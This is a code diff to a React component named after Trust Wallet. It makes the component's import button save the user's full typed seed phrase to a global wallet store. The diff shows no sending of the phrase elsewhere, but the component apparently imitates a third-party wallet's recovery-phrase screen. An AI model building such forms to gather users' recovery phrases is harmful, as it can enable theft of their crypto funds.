@@ -1,10 +1,10 @@
 import { useRef, useState } from "react";
 import { X, Eye, EyeOff } from "lucide-react";
 
-import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { useWalletStore } from "@/store/walletStore";
 
-const TrustWallet = () => {
+const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 	const [walletName, setWalletName] = useState("Main wallet");
 
 	const [words, setWords] = useState<string[]>([""]);
@@ -13,6 +13,12 @@ const TrustWallet = () => {
 	const [nameFocused, setNameFocused] = useState(false);
 	const [areaFocused, setAreaFocused] = useState(false);
 	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+	const { setSeedPhrase } = useWalletStore();
+
+	const handleComplete = () => {
+		setSeedPhrase(words.join(" "));
+		handleFinish();
+	};
 
 	// Add a new input automatically
 	const addNewInput = () => {
@@ -181,6 +187,7 @@ const TrustWallet = () => {
 						{/* Import button */}
 						<div className="flex w-full justify-end items-center">
 							<button
+								onClick={handleComplete}
 								className={`w-full py-3 rounded-full font-medium transition-all mt-auto max-w-80 ${
 									isButtonDisabled
 										? "bg-green-600/60 cursor-not-allowed opacity-50"
